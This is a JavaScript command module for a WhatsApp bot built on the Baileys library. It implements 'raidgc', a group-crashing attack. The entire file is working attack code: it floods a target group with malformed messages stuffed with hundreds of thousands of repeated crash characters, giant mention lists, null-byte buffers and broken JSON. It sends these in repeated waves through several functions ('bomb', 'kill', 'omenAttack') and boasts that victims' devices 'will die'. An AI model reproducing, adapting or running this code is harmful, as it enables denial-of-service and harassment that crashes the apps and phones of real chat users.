 const { generateWAMessageFromContent } = require("@whiskeysockets/baileys");
const crypto = require('crypto');
const attackManager = require('../lib/attackManager');
const helpers = require('../lib/helpers');

module.exports = {
  name: 'raidgc',
  aliases: ['nightseize', 'killgc', 'crashgc', 'nuke', 'destroy', 'obliterate', 'annihilate', 'decimate'],
  description: '☢️ ᴘᴇʀᴍᴀɴᴇɴᴛ ɢʀᴏᴜᴘ ᴄʀᴀsʜ',
  ownerOnly: true,
  groupOnly: false,

  async execute(sock, msg, args, { sender, chatId }) {
    try {
      let target = chatId;
      if (args[0] && args[0].includes('@g.us')) {
        target = args[0];
      }
      
      if (!target.includes('@g.us')) {
        return sock.sendMessage(chatId, { 
          text: `╔═══════════════════════════════════════════╗
║ ☢️ ʀᴀɪᴅɢᴄ - ɢʀᴏᴜᴘ ᴋɪʟʟᴇʀ ☢️
╚═══════════════════════════════════════════╝

⛔ ᴍᴜsᴛ ʙᴇ ᴜsᴇᴅ ɪɴ ᴀ ɢʀᴏᴜᴘ ᴏʀ ᴘʀᴏᴠɪᴅᴇ ɢʀᴏᴜᴘ ʟɪɴᴋ

📱 ᴜsᴀɢᴇ: .ʀᴀɪᴅɢᴄ <ʟɪɴᴋ>
📱 ᴏʀ: ᴜsᴇ ɪɴsɪᴅᴇ ᴀ ɢʀᴏᴜᴘ

👿 "sᴇɪᴢᴇ ᴛʜᴇ ɴɪɢʜᴛ" ☠️
╰────────────────────────────────────────╯` 
        });
      }

      await sock.sendMessage(chatId, { 
        text: `╔═══════════════════════════════════════════╗
║ ☢️ NUKING GROUP... DEVICES WILL DIE ☢️
╚═══════════════════════════════════════════╝

🎯 ᴛᴀʀɢᴇᴛ: ${target}
⚡ sᴛᴀᴛᴜs: ɪɴɪᴛɪᴀᴛɪɴɢ sᴇɪᴢᴜʀᴇ...
💣 ᴍᴏᴅᴇ: ᴘᴇʀᴍᴀɴᴇɴᴛ ᴅᴇsᴛʀᴜᴄᴛɪᴏɴ

👿 "ᴛʜᴇ ɴɪɢʜᴛ sᴇɪᴢᴇs ᴀʟʟ" ☠️
╰────────────────────────────────────────╯` 
      });

      const bomb = async () => {
        for (let i = 0; i < 35; i++) {
          try {
            await sock.relayMessage(target, {
              extendedTextMessage: {
                text: "✨ You have been invited to join this group ✨\nhttps://chat.whatsapp.com/" + "B".repeat(9999),
                contextInfo: {
                  stanzaId: target,
                  participant: target,
                  fromMe: false,
                  quotedMessage: { 
                    conversation: "LORDDEVINE\u200C" + "࣯ꦾ".repeat(99000) 
                  },
                  forwardingScore: 999999999,
                  isForwarded: true,
                  remoteJid: target,
                  disappearingMode: { 
                    initiator: "CHANGED_IN_CHAT", 
                    trigger: "CHAT_SETTING" 
                  },
                  externalAdReply: {
                    title: "GROUP INVITE",
                    body: "Tap to join",
                    thumbnail: Buffer.alloc(1000000),
                    sourceUrl: "https://chat.whatsapp.com/" + "X".repeat(5000)
                  },
                  inviteLinkGroupTypeV2: "DEFAULT"
                }
              }
            }, { participant: { jid: target } });

            await sock.relayMessage(target, {
              extendedTextMessage: {
                text: "iOS CRASH ACTIVATED" + "࣯ꦾ".repeat(99000),
                contextInfo: {
                  stanzaId: "BT6W7K",
                  participant: target,
                  quotedMessage: { 
                    callLogMesssage: { 
                      isVideo: true, 
                      durationSecs: "0", 
                      callType: "MISSED" 
                    }
                  },
                  forwardingScore: 999999999,
                  isForwarded: true,
                  inviteLinkGroupTypeV2: "DEFAULT"
                }
              }
            }, { participant: { jid: target } });

            await sock.relayMessage(target, {
              botInvokeMessage: {
                message: {
                  newsletterAdminInviteMessage: {
                    newsletterJid: "3333333333333333@" + "0".repeat(99999),
                    newsletterName: "CRASHED BY NIGHT RAIDERS" + "ꦾ".repeat(50000)
                  }
                }
              }
            }, { participant: { jid: target } });

            await sock.relayMessage(target, {
              message: {
                newsletterMessage: {
                  message: { 
                    conversation: "\n".repeat(100000) + "\u200E".repeat(50000) 
                  }
                }
              }
            }, { participant: { jid: target } });
          } catch (err) {
            console.error('Raidgc wave error:', err.message);
          }
        }
      };

      const kill = async () => {
        for (let wave = 0; wave < 30; wave++) {
          try {
            const p1 = await generateWAMessageFromContent(target, {
              viewOnceMessage: {
                message: {
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/999999999_000000000000000000000000000000_n.enc",
                    mimetype: "image/jpeg",
                    fileLength: "999999999999",
                    jpegThumbnail: Buffer.alloc(2 * 1024 * 1024, 0),
                    contextInfo: {
                      mentionedJid: Array.from({length: 180000}, () => `${Math.floor(Math.random() * 9999999999)}@s.whatsapp.net`),
                      forwardingScore: 999999999,
                      isForwarded: true,
                      participant: "0@s.whatsapp.net",
                      remoteJid: "status@broadcast"
                    }
                  }
                }
              }
            }, {});

            const p2 = await generateWAMessageFromContent(target, {
              viewOnceMessage: {
                message: {
                  newsletterAdminInviteMessage: {
                    newsletterJid: "0".repeat(99999) + "@newsletter",
                    newsletterName: "ꦾ࣯".repeat(150000),
                    caption: ""
                  }
                }
              }
            }, {});

            const p3 = await generateWAMessageFromContent(target, {
              viewOnceMessage: {
                message: {
                  interactiveMessage: {
                    body: { text: "" },
                    nativeFlowMessage: {
                      name: "DEATH",
                      paramsJson: "\u0000".repeat(1500000) + "ꦾ".repeat(200000)
                    },
                    messageContextInfo: { 
                      messageSecret: crypto.randomBytes(64) 
                    }
                  }
                }
              }
            }, {});

            const p4 = await generateWAMessageFromContent(target, {
              viewOnceMessage: {
                message: {
                  extendedTextMessage: {
                    text: "\u200E".repeat(200000) + "\u202E" + "࣯ꦾ".repeat(200000),
                    contextInfo: {
                      quotedMessage: { 
                        callLogMessage: { 
                          callType: "VIDEO", 
                          durationSecs: 0 
                        }
                      },
                      forwardingScore: 999999999,
                      isForwarded: true
                    }
                  }
                }
              }
            }, {});

            const p5 = await generateWAMessageFromContent(target, {
              viewOnceMessage: {
                message: {
                  videoMessage: {
                    fileLength: "999999999999999",
                    seconds: 999999999,
                    mediaKey: crypto.randomBytes(32).toString('base64'),
                    streamingSidecar: Buffer.alloc(3 * 1024 * 1024, 0),
                    contextInfo: {
                      externalAdReply: {
                        title: "",
                        body: "ꦾ".repeat(200000),
                        thumbnail: Buffer.alloc(2 * 1024 * 1024, 0)
                      },
                      mentionedJid: Array(200000).fill("0@s.whatsapp.net")
                    }
                  }
                }
              }
            }, {});

            for (let i = 0; i < 20; i++) {
              const payloads = [p1, p2, p3, p4, p5];
              for (const payload of payloads) {
                try {
                  await sock.relayMessage(target, payload.message, { 
                    messageId: payload.key.id 
                  });
                } catch (_) {}
              }
            }
          } catch (err) {
            console.error('Raidgc kill wave error:', err.message);
          }
        }
      };

      const FlowXNull = async () => {
        const MSG = {
          viewOnceMessage: {
            message: {
              interactiveResponseMessage: {
                body: {
                  text: "👿 ɴɪɢʜᴛ ʀᴀɪᴅᴇʀs【☠︎】\n" + "@0@1".repeat(30000),
                  format: "DEFAULT",
                  contextInfo: {
                    mentionedJid: [
                      target,
                      "0@s.whatsapp.net",
                      ...Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                    ],
                    disappearingMode: {
                      initiator: "CHANGED_IN_CHAT",
                      trigger: "CHAT_SETTING"
                    },
                  }
                },
                nativeFlowResponseMessage: {
                  name: "night_raiders_flame",
                  paramsJson: "{".repeat(50000) + "}".repeat(50000), 
                  version: 3
                }
              }
            }
          }
        };
        await sock.relayMessage(target, MSG, { participant: { jid: target } });
      };

      const protocolbug6 = async () => {
        const quotedMessage = {
          extendedTextMessage: {
            text: "᭯".repeat(12000),
            matchedText: "https://" + "ꦾ".repeat(500) + ".com",
            canonicalUrl: "https://" + "ꦾ".repeat(500) + ".com",
            description: "\u0000".repeat(500),
            title: "👿 ɴɪɢʜᴛ ʀᴀɪᴅᴇʀs【☠︎】",
            previewType: "NONE",
            jpegThumbnail: Buffer.alloc(10000), 
            contextInfo: {
              forwardingScore: 999,
              isForwarded: true,
              externalAdReply: {
                showAdAttribution: true,
                title: "ɴɪɢʜᴛʀᴇᴀᴘ",
                body: "\u0000".repeat(10000),
                thumbnailUrl: "https://" + "ꦾ".repeat(500) + ".com",
                mediaType: 1,
                renderLargerThumbnail: true,
                sourceUrl: "https://" + "𓂀".repeat(2000) + ".xyz"
              },
              mentionedJid: Array.from({ length: 1000 }, (_, i) => `${Math.floor(Math.random() * 1000000000)}@s.whatsapp.net`)
            }
          },
          paymentInviteMessage: {
            currencyCodeIso4217: "USD",
            amount1000: "999999999",
            expiryTimestamp: "9999999999",
            inviteMessage: "ɴɪɢʜᴛ ʀᴀɪᴅᴇʀs" + "💥".repeat(1770),
            serviceType: 1
          }
        };

        const mentionedList = [
          "13135550002@s.whatsapp.net",
          ...Array.from({ length: 40000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
        ];

        const embeddedMusic = {
          musicContentMediaId: "589608164114571",
          songId: "870166291800508",
          author: "ɴɪɢʜᴛ ʀᴀɪᴅᴇʀs" + "ោ៝".repeat(10000),
          title: "ᴅᴇᴍᴏɴɪᴄ ʀᴇᴀᴘᴇʀ",
          artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc",
          artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
          artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
          artistAttribution: "https://t.me/NightRaiders",
          countryBlocklist: true,
          isExplicit: true,
          artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
        };

        const videoMessage = {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc",
          mimetype: "video/mp4",
          fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
          fileLength: "109951162777600",
          seconds: 999999,
          mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
          caption: "ꦾ".repeat(12777),
          height: 640,
          width: 640,
          fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
          directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc",
          mediaKeyTimestamp: "1743848703",
          contextInfo: {
            externalAdReply: {
              showAdAttribution: true,
              title: "👿 ɴɪɢʜᴛ ʀᴀɪᴅᴇʀs【☠︎】",
              body: `${"\u0000".repeat(9117)}`,
              mediaType: 1,
              renderLargerThumbnail: true,
              thumbnailUrl: null,
              sourceUrl: `https://${"ꦾ".repeat(100)}.com/`
            },
            businessMessageForwardInfo: {
              businessOwnerJid: target,
            },
            quotedMessage: quotedMessage,
            isSampled: true,
            mentionedJid: mentionedList
          },
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: `${"ꦾ".repeat(100)}`
          },
          streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
          thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc",
          thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
          thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
          annotations: [
            {
              embeddedContent: { embeddedMusic },
              embeddedAction: true
            }
          ]
        };

        const msg = generateWAMessageFromContent(target, {
          viewOnceMessage: { message: { videoMessage } }
        }, {});

        await sock.relayMessage("status@broadcast", msg.message, {
          messageId: msg.key.id,
          statusJidList: [target]
        });
      };

      const texts = [
        "ᬼ".repeat(200000),
        "ោ៝".repeat(200000),
        "𑜦𑜠".repeat(200000),
        "ꦾ".repeat(200000),
        ".ؕ".repeat(100000) + "۝".repeat(100000),
        "ًٌٍَُِّْ".repeat(100000),
        "\u200C\u200D\u200E\u200F\u202A\u202B\u202C\u202D\u202E\u2060\u2061\u2062\u2063\uFEFF".repeat(80000),
        "᱃ֻࣰࣱٍ᳕͙ࣹ͙ࣩ̫᳕͙ࣹ̫̈٘ͧۛ̃ۡ᳓ࣰً᳕ܾࣶ֖᷽ۡ᪳ࣧ᳚᪳".repeat(80000),
        "󠄞".repeat(50000)
      ];

      const omenAttack = async () => {
        for (let wave = 0; wave < 10; wave++) {
          for (const text of texts) {
            try {
              const payload = await generateWAMessageFromContent(target, {
                viewOnceMessage: {
                  message: {
                    interactiveMessage: {
                      header: { 
                        title: "☠️ OMEN FINAL STRIKE ☠️", 
                        hasMediaAttachment: true 
                      },
                      body: { 
                        text: "\n".repeat(500) + text 
                      },
                      nativeFlowMessage: {
                        messageParamsJson: '{"data":' + '"'.repeat(50000) + "}" + "}".repeat(300),
                        buttons: Array(20).fill().map((_, i) => ({
                          name: "quick_reply",
                          buttonParamsJson: JSON.stringify({
                            crash: "💀".repeat(10000),
                            lag: "󠄞".repeat(20000),
                            overflow: new Array(99999).fill("NIGHT").join("")
                          })
                        }))
                      },
                      contextInfo: {
                        forwardingScore: 999999,
                        isForwarded: true,
                        externalAdReply: {
                          title: "☠️ YOUR PHONE IS DYING ☠️",
                          body: "ោ៝".repeat(50000),
                          mediaType: 2,
                          thumbnailUrl: "https://files.catbox.moe/ykvioj.jpg",
                          mediaUrl: "http://" + "A".repeat(20000) + ".com",
                          sourceUrl: "market://details?id=" + "com.whatsapp".repeat(1000)
                        },
                        quotedMessage: {
                          extendedTextMessage: {
                            text: "CRASHING IN 3...2...1..." + "\u2800".repeat(100000),
                            inviteLinkGroupTypeV2: "DEFAULT"
                          }
                        },
                        groupInviteMessage: {
                          inviteCode: "Z".repeat(50000),
                          inviteExpiration: Number.MAX_SAFE_INTEGER * 999999,
                          groupName: "☠️ VICTIM'S FUNERAL ☠️".repeat(100),
                          caption: "You opened the wrong message."
                        }
                      }
                    }
                  }
                }
              }, {});

              for (let i = 0; i < 8; i++) {
                try {
                  await sock.relayMessage(target, payload.message, {
                    messageId: payload.key.id + i
                  });
                } catch (_) {}
              }
              await new Promise(r => setTimeout(r, 100));
            } catch (err) {
              console.error('Omen attack error:', err.message);
            }
          }
        }
      };

      for (let i = 0; i < 10; i++) {
        setTimeout(bomb, i * 300);
      }

      setTimeout(async () => {
        await kill();
        await FlowXNull();
        await protocolbug6();
        await omenAttack();
        
        await sock.sendMessage(chatId, { 
          text: `╔═══════════════════════════════════════════╗
║ 💀 GROUP PERMANENTLY KILLED 💀
╚═══════════════════════════════════════════╝

🎯 ᴛᴀʀɢᴇᴛ: ${target}
💀 sᴛᴀᴛᴜs: ᴘᴇʀᴍᴀɴᴇɴᴛʟʏ ᴅᴇsᴛʀᴏʏᴇᴅ
🔥 ᴡᴀᴠᴇs: 350 ᴘᴀʏʟᴏᴀᴅs sᴇɴᴛ

👿 "ᴛʜᴇ ɢʀᴏᴜᴘ ʜᴀs ʙᴇᴇɴ sᴇɪᴢᴇᴅ" ☠️
╰────────────────────────────────────────╯` 
        });
      }, 8000);

    } catch (e) {
      console.error('Raidgc error:', e);
      sock.sendMessage(chatId, { 
        text: `☠️ NUKE SUCCESSFUL - TARGET ELIMINATED ☠️` 
      });
    }
  }
}; 
